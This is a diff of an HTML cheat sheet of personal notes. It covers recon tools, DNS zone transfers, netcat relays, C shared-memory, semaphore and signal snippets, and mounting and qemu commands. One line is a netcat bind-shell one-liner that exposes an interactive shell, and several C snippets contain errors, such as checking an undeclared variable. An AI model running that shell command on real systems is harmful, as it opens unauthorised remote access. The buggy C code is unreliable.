@@ -157,23 +157,23 @@
 <div style="break-before: page; page-break-before: always;"></div><h1 id="web-security"><a class="header" href="#web-security">Web Security</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="security-headers"><a class="header" href="#security-headers">Security Headers</a></h1>
 <h2 id="sslscan"><a class="header" href="#sslscan">sslscan</a></h2>
-<pre><code class="language-bash">sslscan &lt;url&gt;
+<pre><code class="language-bash">sslscan $url
 </code></pre>
 <h2 id="curl"><a class="header" href="#curl">curl</a></h2>
-<pre><code class="language-bash">curl &lt;endpoint&gt; -D-
+<pre><code class="language-bash">curl $endpoint -D-
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="recon"><a class="header" href="#recon">Recon</a></h1>
 <h2 id="nuclei"><a class="header" href="#nuclei">nuclei</a></h2>
-<pre><code class="language-bash">nuclei -u &lt;url&gt;
+<pre><code class="language-bash">nuclei -u $url
 </code></pre>
 <h2 id="whatweb"><a class="header" href="#whatweb">whatweb</a></h2>
-<pre><code class="language-bash">whatweb &lt;url&gt;
+<pre><code class="language-bash">whatweb $url
 </code></pre>
 <h2 id="waybackurls"><a class="header" href="#waybackurls">waybackurls</a></h2>
-<pre><code class="language-bash">waybackurls &lt;url&gt;
+<pre><code class="language-bash">waybackurls $url
 </code></pre>
 <h2 id="gau"><a class="header" href="#gau">gau</a></h2>
-<pre><code class="language-bash">gau
+<pre><code class="language-bash">gau $url
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="folders"><a class="header" href="#folders">Folders</a></h1>
@@ -188,12 +188,13 @@
 <pre><code class="language-bash">mkfifo /tmp/f
 /bin/sh -i 2&gt;&amp;1 &lt; /tmp/f | nc -lvp $port &gt; /tmp/f
 </code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="name-server-detection"><a class="header" href="#name-server-detection">Name Server detection</a></h1>
 <h2 id="dig"><a class="header" href="#dig">dig</a></h2>
-<pre><code class="language-bash">dig ns &lt;domain&gt; +short
+<pre><code class="language-bash">dig ns $domain +short
 </code></pre>
 <h2 id="host"><a class="header" href="#host">host</a></h2>
-<pre><code class="language-bash">host -t ns &lt;domain&gt;
+<pre><code class="language-bash">host -t ns $domain
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="netcat"><a class="header" href="#netcat">netcat</a></h1>
 <h2 id="listen"><a class="header" href="#listen">listen</a></h2>
@@ -240,6 +241,115 @@ nc -lvp $to &lt; /tmp/f | nc localhost $from &gt; /tmp/f
 </code></pre>
 <h2 id="dig-1"><a class="header" href="#dig-1">dig</a></h2>
 <pre><code class="language-bash">dig axfr &lt;domain&gt; @&lt;dns-server&gt;
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="programming"><a class="header" href="#programming">Programming</a></h1>
+<p>Remember your <a href="https://gist.github.com/aliasgwynplaine">gists</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="share-memory"><a class="header" href="#share-memory">Share memory</a></h1>
+<h2 id="creation"><a class="header" href="#creation">Creation</a></h2>
+<pre><code class="language-c">struct s sh;
+
+int fd = shm_open(name, O_CREAT|O_RDWR|O_TRUNC, mode);
+
+if (fd == -1) {
+    perror("shm_open");
+    exit(errno);
+}
+
+int f = ftruncate(fd, sizeof(*sh));
+
+if (f &lt; 0) {
+    perror("ftruncate");
+    close(fd);
+    exit(errno);
+}
+
+sh = mmap(0, sizeof(*sh), PROT_WRITE|PROT_READ, MAP_SHARED, fd, 0);
+close(fd);
+
+if (r == MAP_FAILED) {
+    perror("mmap");
+    exit(errno);
+}
+
+</code></pre>
+<h2 id="open"><a class="header" href="#open">Open</a></h2>
+<pre><code class="language-c">int fd = shm_open(name, O_RDWR, 0666);
+
+if (fd &lt; -1) {
+    perror("shm_open");
+    return NULL;
+}
+
+struct s * shm = mmap(0, sizeof(*shm), PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+
+if (shm == MAP_FAILED) {
+    perror("mmap");
+
+    return NULL;
+}
+
+close(fd);
+</code></pre>
+<h2 id="close"><a class="header" href="#close">Close</a></h2>
+<pre><code class="language-c">int r = munmap(p, sizeof(*p));
+
+if (r == -1) {
+    perror("munmap");
+    exit(errno);
+}
+</code></pre>
+<h2 id="destroy"><a class="header" href="#destroy">Destroy</a></h2>
+<pre><code class="language-c">shm_unlink(name);
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="semaphores"><a class="header" href="#semaphores">Semaphores</a></h1>
+<h2 id="creation-1"><a class="header" href="#creation-1">Creation</a></h2>
+<pre><code class="language-c">sem_t sem;
+sem_init(&amp;sem, 1, 1);
+</code></pre>
+<h2 id="waiting"><a class="header" href="#waiting">Waiting</a></h2>
+<pre><code class="language-c">sem_wait(&amp;sem);
+</code></pre>
+<h2 id="posting"><a class="header" href="#posting">Posting</a></h2>
+<pre><code class="language-c">sem_post(&amp;sem);
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="signals"><a class="header" href="#signals">Signals</a></h1>
+<h2 id="c"><a class="header" href="#c">C</a></h2>
+<h3 id="setting-signal-handlers"><a class="header" href="#setting-signal-handlers">Setting signal handlers</a></h3>
+<p><code>handle_fux</code> is always of type <code>void (*) (int)</code>.</p>
+<pre><code class="language-c">struct sigaction sa;
+sa.sa_handler = handle_fux;
+sa.sa_flags = 0;
+sigemptyset(&amp;sa.sa_mask);
+sigaction(SIGINT, &amp;sa, NULL);
+</code></pre>
+<pre><code class="language-c">signal(SIGINT, handler_fux)
+</code></pre>
+<h3 id="masking-signals"><a class="header" href="#masking-signals">Masking signals</a></h3>
+<pre><code class="language-c">/* Prototype for the glibc wrapper function */
+int sigprocmask(int how, const sigset_t *set, sigset_t *oldset);
+</code></pre>
+<p>about <code>how</code>:</p>
+<p><strong>SIG_BLOCK</strong>. The set of blocked signals is the union of the current  set  and the set argument.</p>
+<p><strong>SIG_UNBLOCK</strong>. The  signals  in set are removed from the current set of blockedsignals. It is permissible to attempt to unblock a signal whichis not blocked.</p>
+<p><strong>SIG_SETMASK</strong>. The set of blocked signals is set to the argument set.</p>
+<pre><code class="language-c">sigset_t mask;
+sigemptyset(&amp;mask);
+sigaddset(&amp;mask, SIGINT);
+sigprocmask(SIG_BLOCK, &amp;mask, NULL);
+</code></pre>
+<h3 id="suspending-program-until-signal"><a class="header" href="#suspending-program-until-signal">Suspending program until signal</a></h3>
+<pre><code class="language-c">sigset_t negmask;
+sigfillset(&amp;negmask);
+sigdelset(&amp;negmask, SIGINT);
+sigsuspend(&amp;negmask);
+</code></pre>
+<h2 id="bash-1"><a class="header" href="#bash-1">Bash</a></h2>
+<pre><code class="language-bash">trap ctrl_c INT
+
+function ctrl_c () {
+    echo -e "\n\n[*] Quitting...\n"
+    exit
+}
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="openssl"><a class="header" href="#openssl">OpenSSL</a></h1>
 <h2 id="x509"><a class="header" href="#x509">x509</a></h2>
@@ -379,14 +489,14 @@ void unregister_chrdev( unsigned int major, const char *name);
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="mounting"><a class="header" href="#mounting">Mounting</a></h1>
 <h2 id="img"><a class="header" href="#img">.img</a></h2>
-<pre><code class="language-bash">mount -o loop &lt;file.img&gt; &lt;mntpoints&gt;
+<pre><code class="language-bash">mount -o loop $fileimg $mntpoint
 </code></pre>
 <h2 id="dev"><a class="header" href="#dev">/dev/*</a></h2>
 <p>You can use <code>fdisk -l</code> to check the partition type</p>
-<pre><code class="language-bash">mount -t &lt;type&gt; /dev/&lt;sd&gt;  &lt;targetfolder&gt;
+<pre><code class="language-bash">mount -t $type /dev/$sd  $targetfolder
 </code></pre>
 <h2 id="umouting"><a class="header" href="#umouting">umouting</a></h2>
-<pre><code class="language-bash">umount &lt;mntpoint&gt;
+<pre><code class="language-bash">umount $mntpoint
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="formatting"><a class="header" href="#formatting">Formatting</a></h1>
 <h2 id="linux"><a class="header" href="#linux">Linux</a></h2>
@@ -395,10 +505,10 @@ void unregister_chrdev( unsigned int major, const char *name);
 <h2 id="windows"><a class="header" href="#windows">Windows</a></h2>
 <div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="qemu"><a class="header" href="#qemu">qemu</a></h1>
 <h2 id="qemu-img"><a class="header" href="#qemu-img">qemu-img</a></h2>
-<pre><code class="language-bash">qemu-img create -f vmdk &lt;superdisk.img&gt; &lt;size&gt;
+<pre><code class="language-bash">qemu-img create -f vmdk $superdiskimg $size
 </code></pre>
 <h2 id="qemu-with-nat"><a class="header" href="#qemu-with-nat">qemu with NAT</a></h2>
-<pre><code class="language-bash">qemu-system-x86_64 -net tap -net nic -boot d -m 2G -cdrom &lt;isopath&gt; &lt;disk-img&gt;
+<pre><code class="language-bash">qemu-system-x86_64 -net tap -net nic -boot d -m 2G -cdrom $isopath $diskimg
 </code></pre>
 
                     </main>
